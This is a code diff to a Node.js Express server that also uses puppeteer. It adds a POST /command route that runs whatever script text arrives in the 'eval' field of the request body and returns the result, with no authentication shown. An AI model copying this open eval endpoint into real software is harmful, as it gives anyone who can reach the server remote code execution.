@@ -7,6 +7,7 @@ const https = require("https");
 const WebSocket = require("ws");
 const fs = require("fs");
 const path = require("path");
+const bodyParser = require("body-parser");
 const puppeteer = require("puppeteer");
 
 const app = express();
@@ -274,6 +275,9 @@ const routeHtml = function() {
 //app.use("/remote", express.static(__dirname + "/html/remote.html"));
 //app.use("/console", express.static(__dirname + "/html/console.html"));
 
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
 /*
 app.get("/", function(req, res) {
   res.status(200).send("");
@@ -283,6 +287,11 @@ app.get("/", function(req, res) {
 app.get("/clear", function(req, res) {
   res.clearCookie("token");
   res.redirect(302, "/");
+});
+
+app.post("/command", function(req, res) {
+  res.setHeader("Content-Type", "text/plain");
+  res.end(runScript(req.body.eval));
 });
 
 app.get("/facebook", function(req, res) {
